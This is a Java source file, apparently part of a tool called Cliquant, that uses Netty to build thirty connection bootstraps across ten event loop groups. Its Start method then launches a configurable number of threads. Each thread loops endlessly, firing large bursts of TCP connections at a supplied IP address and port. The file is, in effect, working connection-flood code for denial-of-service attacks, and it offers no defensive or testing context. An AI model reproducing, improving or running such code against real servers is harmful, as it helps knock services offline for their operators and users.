package lv.cliquant;

import io.netty.bootstrap.Bootstrap;
import io.netty.channel.EventLoopGroup;
import io.netty.channel.epoll.EpollEventLoopGroup;
import io.netty.util.ResourceLeakDetector;
import lv.cliquant.Utils.BootStrapGen;

import java.util.concurrent.Executors;

public class BootStrap {
    public void Start(String ip, int port, int conns, int threads) throws Exception {
        try {
            ResourceLeakDetector.setEnabled(true);
        } catch (Exception exception) {}
        int delayTime = 2000;
        EpollEventLoopGroup epollEventLoopGroup1 = new EpollEventLoopGroup(threads, Executors.newFixedThreadPool(threads));
        Bootstrap bootstrap = (new BootStrapGen()).generateBootstrap((EventLoopGroup)epollEventLoopGroup1);
        Bootstrap bootstrap2 = (new BootStrapGen()).generateBootstrap((EventLoopGroup)epollEventLoopGroup1);
        Bootstrap bootstrap3 = (new BootStrapGen()).generateBootstrap((EventLoopGroup)epollEventLoopGroup1);
        EpollEventLoopGroup epollEventLoopGroup2 = new EpollEventLoopGroup(threads, Executors.newFixedThreadPool(threads));
        Bootstrap bootstrap4 = (new BootStrapGen()).generateBootstrap((EventLoopGroup)epollEventLoopGroup2);
        Bootstrap bootstrap5 = (new BootStrapGen()).generateBootstrap((EventLoopGroup)epollEventLoopGroup2);
        Bootstrap bootstrap6 = (new BootStrapGen()).generateBootstrap((EventLoopGroup)epollEventLoopGroup2);
        EpollEventLoopGroup epollEventLoopGroup3 = new EpollEventLoopGroup(threads, Executors.newFixedThreadPool(threads));
        Bootstrap bootstrap7 = (new BootStrapGen()).generateBootstrap((EventLoopGroup)epollEventLoopGroup3);
        Bootstrap bootstrap8 = (new BootStrapGen()).generateBootstrap((EventLoopGroup)epollEventLoopGroup3);
        Bootstrap bootstrap9 = (new BootStrapGen()).generateBootstrap((EventLoopGroup)epollEventLoopGroup3);
        EpollEventLoopGroup epollEventLoopGroup4 = new EpollEventLoopGroup(threads, Executors.newFixedThreadPool(threads));
        Bootstrap bootstrap10 = (new BootStrapGen()).generateBootstrap((EventLoopGroup)epollEventLoopGroup4);
        Bootstrap bootstrap11 = (new BootStrapGen()).generateBootstrap((EventLoopGroup)epollEventLoopGroup4);
        Bootstrap bootstrap12 = (new BootStrapGen()).generateBootstrap((EventLoopGroup)epollEventLoopGroup4);
        EpollEventLoopGroup epollEventLoopGroup5 = new EpollEventLoopGroup(threads, Executors.newFixedThreadPool(threads));
        Bootstrap bootstrap13 = (new BootStrapGen()).generateBootstrap((EventLoopGroup)epollEventLoopGroup5);
        Bootstrap bootstrap14 = (new BootStrapGen()).generateBootstrap((EventLoopGroup)epollEventLoopGroup5);
        Bootstrap bootstrap15 = (new BootStrapGen()).generateBootstrap((EventLoopGroup)epollEventLoopGroup5);
        EpollEventLoopGroup epollEventLoopGroup6 = new EpollEventLoopGroup(threads, Executors.newFixedThreadPool(threads));
        Bootstrap bootstrap16 = (new BootStrapGen()).generateBootstrap((EventLoopGroup)epollEventLoopGroup6);
        Bootstrap bootstrap17 = (new BootStrapGen()).generateBootstrap((EventLoopGroup)epollEventLoopGroup6);
        Bootstrap bootstrap18 = (new BootStrapGen()).generateBootstrap((EventLoopGroup)epollEventLoopGroup6);
        EpollEventLoopGroup epollEventLoopGroup7 = new EpollEventLoopGroup(threads, Executors.newFixedThreadPool(threads));
        Bootstrap bootstrap19 = (new BootStrapGen()).generateBootstrap((EventLoopGroup)epollEventLoopGroup7);
        Bootstrap bootstrap20 = (new BootStrapGen()).generateBootstrap((EventLoopGroup)epollEventLoopGroup7);
        Bootstrap bootstrap21 = (new BootStrapGen()).generateBootstrap((EventLoopGroup)epollEventLoopGroup7);
        EpollEventLoopGroup epollEventLoopGroup8 = new EpollEventLoopGroup(threads, Executors.newFixedThreadPool(threads));
        Bootstrap bootstrap22 = (new BootStrapGen()).generateBootstrap((EventLoopGroup)epollEventLoopGroup8);
        Bootstrap bootstrap23 = (new BootStrapGen()).generateBootstrap((EventLoopGroup)epollEventLoopGroup8);
        Bootstrap bootstrap24 = (new BootStrapGen()).generateBootstrap((EventLoopGroup)epollEventLoopGroup8);
        EpollEventLoopGroup epollEventLoopGroup9 = new EpollEventLoopGroup(threads, Executors.newFixedThreadPool(threads));
        Bootstrap bootstrap25 = (new BootStrapGen()).generateBootstrap((EventLoopGroup)epollEventLoopGroup9);
        Bootstrap bootstrap26 = (new BootStrapGen()).generateBootstrap((EventLoopGroup)epollEventLoopGroup9);
        Bootstrap bootstrap27 = (new BootStrapGen()).generateBootstrap((EventLoopGroup)epollEventLoopGroup9);
        EpollEventLoopGroup epollEventLoopGroup10 = new EpollEventLoopGroup(threads, Executors.newFixedThreadPool(threads));
        Bootstrap bootstrap28 = (new BootStrapGen()).generateBootstrap((EventLoopGroup)epollEventLoopGroup10);
        Bootstrap bootstrap29 = (new BootStrapGen()).generateBootstrap((EventLoopGroup)epollEventLoopGroup10);
        Bootstrap bootstrap30 = (new BootStrapGen()).generateBootstrap((EventLoopGroup)epollEventLoopGroup10);
        for (int a31 = 0; a31 < threads; a31++) {
            (new Thread(() -> {
                try {
                    while (true) {
                        for (int a32 = 0; a32 < conns; a32++) {
                            bootstrap.connect(ip, port);
                            bootstrap2.connect(ip, port);
                            bootstrap3.connect(ip, port);
                            bootstrap4.connect(ip, port);
                            bootstrap5.connect(ip, port);
                            bootstrap6.connect(ip, port);
                            bootstrap7.connect(ip, port);
                            bootstrap8.connect(ip, port);
                            bootstrap9.connect(ip, port);
                            bootstrap10.connect(ip, port);
                            bootstrap11.connect(ip, port);
                            bootstrap12.connect(ip, port);
                            bootstrap13.connect(ip, port);
                            bootstrap14.connect(ip, port);
                            bootstrap15.connect(ip, port);
                            bootstrap16.connect(ip, port);
                            bootstrap17.connect(ip, port);
                            bootstrap18.connect(ip, port);
                            bootstrap19.connect(ip, port);
                            bootstrap20.connect(ip, port);
                            bootstrap21.connect(ip, port);
                            bootstrap22.connect(ip, port);
                            bootstrap23.connect(ip, port);
                            bootstrap24.connect(ip, port);
                            bootstrap25.connect(ip, port);
                            bootstrap26.connect(ip, port);
                            bootstrap27.connect(ip, port);
                            bootstrap28.connect(ip, port);
                            bootstrap29.connect(ip, port);
                            bootstrap30.connect(ip, port);
                        }
                        Thread.sleep(delayTime);
                    }
                } catch (InterruptedException interruptedException) {
                    return;
                }
            })).start();
        }
    }
}

// © 2022 Copyright www.pixeldown.ml - Cliquant

